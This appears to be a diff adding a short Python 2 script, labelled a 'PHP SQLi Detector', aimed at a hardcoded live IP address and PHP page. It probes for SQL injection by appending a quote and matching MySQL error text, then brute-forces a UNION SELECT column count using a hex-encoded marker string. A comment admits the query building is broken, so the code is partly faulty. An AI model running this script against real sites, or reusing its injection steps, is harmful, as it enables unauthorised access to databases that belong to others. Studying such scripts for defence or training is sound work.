@@ -1,0 +1,39 @@
+#!/usr/bin/env python
+print "\n### PHP SQLi Detector ###"
+import urllib2,re,sys
+
+TARGET = "http://54.172.112.249/acre2.php?lap=acer"
+
+SQLi = "'"
+SQLiError = "You have an error in your SQL"
+myNameInHex = "0x6a6f65"
+myName = 'joe'
+
+print "==> Testing for SQLi Error Vuln..."
+URL = TARGET+SQLi
+try:
+	source = urllib2.urlopen(URL).read() ## WEB REQUEST
+except urllib2.URLError, e:
+	print "$$$ We had an Error\n",e
+	sys.exit(0)
+if re.search(SQLiError,source): ## SEARCH FOR ERROR IN PAGE
+	print "!! ==> SQLi Found:",TARGET+SQLi
+	print "## ==> Bruting NULL column...",
+URL = TARGET+SQLi+"+UNION+SELECT+" ## BUILD OUR SQLi STATEMENT
+for x in xrange(1,8):
+	if x > 1:
+		# URL = URL+","
+		URL = URL+myNameInHex
+		URL = URL+","	# This comma at the end is breaking it
+		print x,
+		try:
+			source = urllib2.urlopen((URL+"-- +")).read() ## WEB REQUEST
+		except urllib2.URLError, e:
+			print "$$$ We had an Error\n",e
+			sys.exit(0)
+		if re.search(myName, source): ## SEARCH FOR UNENCODED NULL WORD
+			print "\n!! ==> Null Column Found:",URL+"--"
+			break
+else:
+	print "** ==> No SQLi Found!"
+print "\nScan Complete\n"
